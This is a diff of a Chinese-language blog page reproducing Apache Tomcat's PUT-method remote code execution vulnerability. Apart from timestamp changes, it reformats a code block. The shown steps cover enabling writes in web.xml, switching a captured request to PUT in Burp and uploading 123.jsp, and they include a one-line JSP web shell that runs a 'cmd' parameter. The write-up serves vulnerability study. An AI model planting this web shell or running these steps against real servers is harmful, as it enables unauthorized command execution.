@@ -345,7 +345,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-10 10:56:54'>2019-12-10 09:42</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-10 11:01:19'>2019-12-10 09:42</time>
         
     </div>
     <div class="article-meta">
@@ -407,7 +407,11 @@ Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于
 
 
 <p>（二） 远程代码执行<br>1、 漏洞简介及成因<br>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。<br>影响版本： Apache Tomcat 7.0.0 – 7.0.81<br>2、 漏洞复现<br>配置漏洞，开启put方法可上传文件功能。<br>tomcat文件夹下的/conf/web.xml文件插入：<br><img src="http://zone.secevery.com/uploads/article/20191206/3a289938b8d48a0523d5c1edff41b2fc.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;init-param&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">重启tomcat服务。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">访问http:&#x2F;&#x2F;xxxx:8080，burp抓包，将请求方式改为PUT，创建一个123.jsp，并用%20转义空格字符。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">123.jsp内容为</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</span></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;init-param&gt;</span></pre></td></tr></table></figure>
+
+<p>重启tomcat服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">访问http:&#x2F;&#x2F;xxxx:8080,</span></pre></td></tr></table></figure>
+<p>burp抓包，将请求方式改为PUT，创建一个123.jsp，并用%20转义空格字符。<br>123.jsp内容为<br>&lt;%Runtime.getRuntime().exec(request.getParameter(“cmd”));%&gt;</p>
 <img src="http://zone.secevery.com/uploads/article/20191206/777f9c7b7c2ea0fbcd1e5b78d37b9d11.png">
 返回201，说明创建成功。
 服务器上已经存在文件
@@ -440,7 +444,7 @@ Tomcat安装目录下conf里的tomcat-users.xml配置如下：
     
     <p><span class="copy-title">本文作者:</span><a  title="Zack">Zack</a></p>
     <p><span class="copy-title">发布时间:</span>2019-12-10, 09:42:12</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-10, 10:56:54</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-10, 11:01:19</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/10/my-first-blog/" title="my-first-blog">http://zackerys.com/2019/12/10/my-first-blog/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
